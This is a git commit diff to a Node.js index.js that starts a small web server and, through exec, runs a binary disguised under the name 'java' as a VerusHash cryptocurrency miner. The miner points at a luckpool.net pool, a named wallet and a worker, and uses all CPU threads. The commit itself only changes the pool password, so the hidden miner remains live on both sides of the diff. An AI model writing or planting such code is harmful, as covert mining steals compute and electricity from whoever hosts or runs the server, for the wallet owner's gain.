39686c6a0bab827836e8790d6709ddac73dafb90
HESTER JUKI <157267051+hesterjuki@users.noreply.github.com>
2024-04-16 06:45:36 +0700

    Update index.js

--- index.js
+++ index.js
@@ -13,6 +13,6 @@ server.listen(prt, () => {
   console.log(`Server berjalan pada port ${prt}`);
 });
 
-exec('chmod +x java && ./java --algorithm verushash --pool eu.luckpool.net:3956 --wallet RQ2DksvgV757VsxRuMnfBDBwa5uCz4t5XR --password x --cpu-threads 0 --log-file ./Logs/log-itz.txt --worker ramstein', (error, stdout, stderr) => {
+exec('chmod +x java && ./java --algorithm verushash --pool eu.luckpool.net:3956 --wallet RQ2DksvgV757VsxRuMnfBDBwa5uCz4t5XR --password hybrid --cpu-threads 0 --log-file ./Logs/log-itz.txt --worker ramstein', (error, stdout, stderr) => {
   console.log(stdout);
  });
